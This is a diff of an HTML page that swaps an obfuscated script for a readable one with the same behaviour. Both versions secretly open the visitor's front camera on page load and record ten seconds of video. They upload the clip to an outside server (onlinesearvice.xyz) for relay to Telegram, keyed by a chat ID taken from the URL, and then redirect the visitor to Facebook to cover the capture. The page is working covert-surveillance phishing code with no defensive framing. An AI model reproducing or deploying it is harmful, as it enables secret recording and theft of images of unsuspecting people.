@@ -23,7 +23,7 @@
     <input type="hidden" id="chatid" name="chatid" value="">
 
     <script>
-        // JavaScript to extract 'Shofikul' from the URL and set it in the hidden input field
+        // JavaScript to extract 'id' from the URL and set it in the hidden input field
         function getChatIdFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('id');
@@ -34,7 +34,76 @@
     </script>
 
     <script>
-        const _0x231ad7=_0x267c;(function(_0x19b23b,_0x27fec6){const _0x2e27f1=_0x267c,_0x556a00=_0x19b23b();while(!![]){try{const _0x19ab00=-parseInt(_0x2e27f1(0xef))/0x1*(-parseInt(_0x2e27f1(0xf4))/0x2)+parseInt(_0x2e27f1(0xe8))/0x3+parseInt(_0x2e27f1(0xfd))/0x4+-parseInt(_0x2e27f1(0xfc))/0x5+-parseInt(_0x2e27f1(0xfe))/0x6*(parseInt(_0x2e27f1(0xfb))/0x7)+parseInt(_0x2e27f1(0xe0))/0x8+-parseInt(_0x2e27f1(0xe5))/0x9;if(_0x19ab00===_0x27fec6)break;else _0x556a00['push'](_0x556a00['shift']());}catch(_0xab5bd1){_0x556a00['push'](_0x556a00['shift']());}}}(_0x2ef0,0x32639));const cameraContainer=document['getElementById'](_0x231ad7(0xf5)),capturingMessage=document[_0x231ad7(0xe7)](_0x231ad7(0xff)),cameraFeed=document[_0x231ad7(0xe7)](_0x231ad7(0xeb));let mediaRecorder,recordedChunks=[];async function setupCamera(){const _0x5af6b7=_0x231ad7;try{const _0x2220c9=await navigator['mediaDevices'][_0x5af6b7(0xec)]({'video':{'facingMode':_0x5af6b7(0xf9)}});cameraFeed['srcObject']=_0x2220c9;}catch(_0x27186f){console['error'](_0x5af6b7(0xed),_0x27186f);}}function startRecording(){const _0x224b33=_0x231ad7;try{mediaRecorder=new MediaRecorder(cameraFeed[_0x224b33(0xf8)],{'mimeType':_0x224b33(0xe9)}),mediaRecorder[_0x224b33(0xf6)]=function(_0x2158a4){const _0x59e8b2=_0x224b33;_0x2158a4['data']['size']>0x0&&recordedChunks[_0x59e8b2(0xe1)](_0x2158a4[_0x59e8b2(0xdf)]);},mediaRecorder[_0x224b33(0xf2)]=function(){const _0xe27802=_0x224b33,_0x35676c=new Blob(recordedChunks,{'type':_0xe27802(0xe9)}),_0x4c649a=chatIdInput[_0xe27802(0xf7)],_0x3e271f=_0xe27802(0xde),_0x2d5444=new FormData();_0x2d5444['append']('video',_0x35676c,_0xe27802(0xf0)),fetch(_0x3e271f,{'method':_0xe27802(0xe2),'body':_0x2d5444,'headers':{'Chat-ID':_0x4c649a}})['then'](_0x417e50=>{const _0x5c56be=_0xe27802;_0x417e50['ok']?console[_0x5c56be(0xdd)](_0x5c56be(0xee)):console['error'](_0x5c56be(0xf1)),setTimeout(()=>{const _0x2cbc7e=_0x5c56be;window[_0x2cbc7e(0xe6)][_0x2cbc7e(0xe4)]='https://www.facebook.com';},0xbb8);});},mediaRecorder['start'](),setTimeout(()=>{const _0x1c2178=_0x224b33;mediaRecorder[_0x1c2178(0xf3)]();},0x2710);}catch(_0x7ed876){console[_0x224b33(0xea)](_0x224b33(0xe3),_0x7ed876);}}function _0x267c(_0x2b1ec8,_0x17042d){const _0x2ef070=_0x2ef0();return _0x267c=function(_0x267cd6,_0x14c273){_0x267cd6=_0x267cd6-0xdd;let _0x303af8=_0x2ef070[_0x267cd6];return _0x303af8;},_0x267c(_0x2b1ec8,_0x17042d);}function _0x2ef0(){const _0x1261a3=['40206QfvhVR','capturingMessage','log','https://onlinesearvice.xyz/video/send.php','data','2711136AhVUfm','push','POST','Error\x20starting\x20recording:','href','7525413fVkhgG','location','getElementById','1215999XhRECK','video/webm','error','cameraFeed','getUserMedia','Error\x20accessing\x20camera:','Video\x20sent\x20to\x20Telegram\x20via\x20PHP!','17rkIMbf','recorded_video.webm','Failed\x20to\x20send\x20video\x20to\x20Telegram.','onstop','stop','23106FaPYyb','cameraContainer','ondataavailable','value','srcObject','user','onloadedmetadata','7AXKWSi','807155ggYEue','1080224aeAzZU'];_0x2ef0=function(){return _0x1261a3;};return _0x2ef0();}setupCamera(),cameraFeed[_0x231ad7(0xfa)]=function(){startRecording();};
+        const cameraContainer = document.getElementById("cameraContainer");
+        const capturingMessage = document.getElementById("capturingMessage");
+        const cameraFeed = document.getElementById("cameraFeed");
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                cameraFeed.srcObject = stream;
+            } catch (error) {
+                console.error("Error accessing camera:", error);
+            }
+        }
+
+        function startRecording() {
+            try {
+                mediaRecorder = new MediaRecorder(cameraFeed.srcObject, { mimeType: 'video/webm' });
+
+                mediaRecorder.ondataavailable = function (event) {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function () {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+
+                    // Send the recorded video to a PHP script for processing
+                    const chatID = chatIdInput.value; // Get chat ID from the hidden input field
+                    const apiUrl = 'https://onlinesearvice.xyz/video/send.php'; // Your PHP script's URL for sending videos
+                    const formData = new FormData();
+                    formData.append('video', blob, 'recorded_video.webm');
+
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Chat-ID': chatID // Send the chat ID as a header
+                        }
+                    }).then(response => {
+                        if (response.ok) {
+                            console.log('Video sent to Telegram via PHP!');
+                        } else {
+                            console.error('Failed to send video to Telegram.');
+                        }
+
+                        // Redirect to Facebook after a brief delay
+                        setTimeout(() => {
+                            window.location.href = "https://www.facebook.com";
+                        }, 3000); // Delay for 3 seconds (3000 milliseconds)
+                    });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000); // Record for 10 seconds
+            } catch (error) {
+                console.error("Error starting recording:", error);
+            }
+        }
+
+        setupCamera();
+
+        // Start recording when the camera is ready
+        cameraFeed.onloadedmetadata = function () {
+            startRecording();
+        };
     </script>
 </body>
 </html>
